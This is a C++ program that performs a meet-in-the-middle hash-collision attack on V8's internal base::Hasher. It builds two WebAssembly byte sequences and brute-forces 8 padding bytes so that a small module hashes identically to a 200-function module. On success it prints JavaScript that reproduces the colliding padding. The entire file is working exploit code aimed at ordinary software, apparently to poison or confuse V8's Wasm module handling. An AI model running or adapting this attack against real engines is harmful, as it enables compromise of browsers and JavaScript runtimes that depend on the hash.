// Birthday attack via sort-merge join — avoids random cache misses.
// Memory: ~9 GB (3 left + 3 right + 3 temp for radix sort).
// Time:   ~15-25 min expected (vs 3+ hrs for hash-table approach).
// Build: g++ -O3 -std=c++17 -pthread hash_solve_merge.cc -o hash_solve_merge

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <vector>
#include <chrono>
#include <algorithm>

// ---- V8 base::Hasher internals -------------------------------------------
static constexpr uint64_t M = 0xC6A4A7935BD1E995ULL;
static uint64_t LOOKUP[256];

static uint64_t modinv64(uint64_t a) {
    uint64_t x = a;
    for (int i = 0; i < 6; ++i) x *= 2 - a * x;
    return x;
}
static const uint64_t M_INV = modinv64(M);

static void init_lookup() {
    for (int b = 0; b < 256; ++b) {
        uint64_t a = (uint64_t)b * M;
        LOOKUP[b] = (a ^ (a >> 47)) * M;
    }
}
static inline uint64_t fwd(uint64_t s, uint8_t b) { return (s ^ LOOKUP[b]) * M; }
static inline uint64_t bwd(uint64_t s, uint8_t b) { return s * M_INV ^ LOOKUP[b]; }

static uint64_t hash_bytes(uint64_t s, const uint8_t *d, size_t n) {
    for (size_t i = 0; i < n; ++i) s = fwd(s, d[i]);
    return s;
}
static uint64_t hash_u64(uint64_t s, uint64_t v) {
    for (int i = 0; i < 8; ++i) s = fwd(s, (v >> (8*i)) & 0xff);
    return s;
}

// ---- Wasm bytes -----------------------------------------------------------
static const uint8_t WIRE_1FN[] = {
    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
    0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
    0x03,0x02,0x01,0x00,
    0x07,0x08,0x01,0x04,0x6d,0x61,0x69,0x6e,0x00,0x00,
    0x0a,0x06,0x01,0x04,0x00,0x41,0x2a,0x0b
};
// Correct: LEB128(1 + 1184 = 1185) = [0xa1, 0x09]
static const uint8_t CUSTOM_HDR[] = {0x00,0xa1,0x09,0x00};

static std::vector<uint8_t> build_wire200() {
    auto leb = [](uint32_t n, std::vector<uint8_t> &v) {
        do { uint8_t b=n&0x7f; n>>=7; v.push_back(b|(n?0x80:0)); } while(n);
    };
    uint32_t N=200;
    std::vector<uint8_t> out={0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
                              0x01,0x05,0x01,0x60,0x00,0x01,0x7f};
    std::vector<uint8_t> fp; leb(N,fp); for(uint32_t i=0;i<N;i++) fp.push_back(0);
    out.push_back(0x03); leb(fp.size(),out); for(auto b:fp) out.push_back(b);
    std::vector<uint8_t> body={0x04,0x00,0x41,0x00,0x0b};
    std::vector<uint8_t> cp; leb(N,cp);
    for(uint32_t i=0;i<N;i++) for(auto b:body) cp.push_back(b);
    out.push_back(0x0a); leb(cp.size(),out); for(auto b:cp) out.push_back(b);
    return out;
}

// ---- Sort-merge -----------------------------------------------------------
// 12-byte entry: 8-byte state key + 4-byte input key
struct Entry {
    uint64_t state;
    uint32_t key;
};

// LSD radix sort: sort entries by state using 8 passes (1 byte per pass).
// buf[] → result in buf[] (even passes, since 8 is even).
// tmp[] is a scratch buffer of the same size.
static void radix_sort(Entry *buf, Entry *tmp, size_t n) {
    for (int shift = 0; shift < 64; shift += 8) {
        // Count
        uint32_t count[256] = {};
        for (size_t i = 0; i < n; ++i)
            ++count[(buf[i].state >> shift) & 0xFF];
        // Prefix sum
        uint32_t prefix = 0;
        for (int b = 0; b < 256; ++b) {
            uint32_t c = count[b]; count[b] = prefix; prefix += c;
        }
        // Scatter
        for (size_t i = 0; i < n; ++i)
            tmp[count[(buf[i].state >> shift) & 0xFF]++] = buf[i];
        // Swap
        Entry *t = buf; buf = tmp; tmp = t;
    }
    // After 8 passes (even), result is in original buf pointer.
    // Because we swapped 8 times, result is in buf (original).
}

static constexpr uint32_t A = 1664525u, C = 1013904223u;

int main() {
    init_lookup();
    auto wire200 = build_wire200();

    uint64_t S_start = hash_u64(0, 1225);
    uint64_t S_X     = hash_bytes(S_start, wire200.data(), wire200.size());
    uint64_t S_A     = hash_bytes(S_start, WIRE_1FN, sizeof(WIRE_1FN));
    uint64_t S_B     = hash_bytes(S_A, CUSTOM_HDR, sizeof(CUSTOM_HDR));

    // target_8 = S_X * M_INV^1176  (undo 1176 zero-byte fwd steps)
    uint64_t target_8 = S_X;
    for (int i = 0; i < 1176; ++i) target_8 *= M_INV;

    printf("S_B      = %016llx\n", (unsigned long long)S_B);
    printf("S_X      = %016llx\n", (unsigned long long)S_X);
    printf("target_8 = %016llx\n", (unsigned long long)target_8);
    printf("wire200 size = %zu\n", wire200.size());
    fflush(stdout);

    // Try to allocate 3 arrays of N entries each (left, right, temp for sort)
    size_t N = 1u << 28;  // 256M entries: 3 × 3 GB = 9 GB
    Entry *left = nullptr, *right = nullptr, *tmp = nullptr;
    while (N >= (1u << 24)) {
        left  = (Entry*)malloc(N * sizeof(Entry));
        right = (Entry*)malloc(N * sizeof(Entry));
        tmp   = (Entry*)malloc(N * sizeof(Entry));
        if (left && right && tmp) break;
        free(left); free(right); free(tmp);
        left = right = tmp = nullptr;
        N >>= 1;
        printf("Halving N to %zu (%.1f GB each)\n", N, (double)N*12/1e9);
        fflush(stdout);
    }
    if (!left) { printf("OOM\n"); return 1; }
    printf("N=%zu (%.1f GB per array), 3 arrays = %.1f GB total\n",
           N, (double)N*12/1e9, (double)N*36/1e9);
    // Expected collision probability per trial: N^2 / 2^64
    double prob = (double)N * (double)N / 18446744073709551616.0;
    printf("Prob/trial: %.2e, expected trials: %.0f\n", prob, 1.0/prob);
    fflush(stdout);

    auto t0 = std::chrono::steady_clock::now();

    for (uint32_t trial = 0; trial < 100000; ++trial) {
        double elapsed = std::chrono::duration<double>(
            std::chrono::steady_clock::now() - t0).count();
        printf("  trial %u, %.1f s total\n", trial, elapsed);
        fflush(stdout);

        // Build LEFT: N entries where Q = fwd^4(S_B, b0..b3)
        uint32_t lk = trial * 2654435761u;
        for (size_t i = 0; i < N; ++i) {
            lk = lk * A + C;
            uint8_t b0=lk>>24, b1=(lk>>16)&0xff, b2=(lk>>8)&0xff, b3=lk&0xff;
            uint64_t Q = fwd(fwd(fwd(fwd(S_B, b0), b1), b2), b3);
            left[i] = {Q, lk};
        }

        // Build RIGHT: N entries where R = bwd^4(target_8, b7..b4)
        uint32_t rk = trial * 2654435761u ^ 0xDEADBEEFu;
        for (size_t i = 0; i < N; ++i) {
            rk = rk * A + C;
            uint8_t b4=rk>>24, b5=(rk>>16)&0xff, b6=(rk>>8)&0xff, b7=rk&0xff;
            uint64_t R = bwd(bwd(bwd(bwd(target_8, b7), b6), b5), b4);
            right[i] = {R, rk};
        }

        // Sort both by state (radix sort, 8 passes, result in left/right)
        radix_sort(left, tmp, N);
        radix_sort(right, tmp, N);

        // Merge-join: scan both sorted arrays for matching states
        size_t li = 0, ri = 0;
        while (li < N && ri < N) {
            if (left[li].state < right[ri].state) { ++li; }
            else if (left[li].state > right[ri].state) { ++ri; }
            else {
                // Match: left[li].state == right[ri].state
                uint32_t lkv = left[li].key;
                uint32_t rkv = right[ri].key;
                uint8_t b0=lkv>>24, b1=(lkv>>16)&0xff, b2=(lkv>>8)&0xff, b3=lkv&0xff;
                uint8_t b4=rkv>>24, b5=(rkv>>16)&0xff, b6=(rkv>>8)&0xff, b7=rkv&0xff;

                // Verify full 8-byte path
                uint64_t v = fwd(fwd(fwd(fwd(fwd(fwd(fwd(fwd(S_B,b0),b1),b2),b3),b4),b5),b6),b7);
                if (v == target_8) {
                    // Verify zero tail
                    uint64_t tail = target_8;
                    for (int z = 0; z < 1176; ++z) tail = fwd(tail, 0);
                    if (tail == S_X) {
                        double t = std::chrono::duration<double>(
                            std::chrono::steady_clock::now() - t0).count();
                        uint8_t b[8] = {b0,b1,b2,b3,b4,b5,b6,b7};
                        printf("\nFound in %.1f s!\n", t);
                        printf("b[0..7]=%02x %02x %02x %02x %02x %02x %02x %02x\n",
                               b[0],b[1],b[2],b[3],b[4],b[5],b[6],b[7]);
                        // Verify hash(wire200) path
                        uint64_t h8 = hash_bytes(S_B, b, 8);
                        uint8_t zeros[1176] = {};
                        uint64_t full = hash_bytes(h8, zeros, 1176);
                        printf("hash8=%016llx target=%016llx %s\n",
                               (unsigned long long)h8, (unsigned long long)target_8,
                               h8==target_8?"OK":"MISMATCH");
                        printf("full=%016llx S_X=%016llx %s\n",
                               (unsigned long long)full, (unsigned long long)S_X,
                               full==S_X?"OK":"MISMATCH");
                        printf("\n=== SOLUTION ===\n");
                        printf("const pad = new Uint8Array(1184);\n");
                        for (int i = 0; i < 8; ++i)
                            printf("pad[%d] = 0x%02x;\n", i, b[i]);
                        printf("// (pad[8..1183] remain 0x00)\n");
                        fflush(stdout);
                        free(left); free(right); free(tmp);
                        return 0;
                    }
                }
                ++li; // advance both past this match
            }
        }
    }
    printf("No solution found in 100000 trials\n");
    free(left); free(right); free(tmp);
    return 1;
}
